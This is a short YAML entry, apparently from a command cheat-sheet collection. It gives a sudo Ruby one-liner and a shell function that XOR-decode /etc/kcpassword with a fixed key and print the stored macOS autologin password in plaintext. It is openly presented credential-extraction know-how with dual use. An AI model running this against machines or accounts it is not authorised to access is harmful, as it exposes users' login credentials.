title: macos autologin password
description: Use ruby to retrieve the MacOS autologin password.
command: sudo ruby -e 'key = [125, 137, 82, 35, 210, 188, 221, 234, 163, 185, 31]; IO.read("/etc/kcpassword").bytes.each_with_index { |b, i| break if key.include?(b); print [b ^ key[i % key.size]].pack("U*") }'
function: |
  function macos_autologin_password() {
    sudo $(which ruby) -e 'key = [125, 137, 82, 35, 210, 188, 221, 234, 163, 185, 31]; IO.read("/etc/kcpassword").bytes.each_with_index { |b, i| break if key.include?(b); print [b ^ key[i % key.size]].pack("U*") }'
  }
params:
tags: [credential, hash, macos]
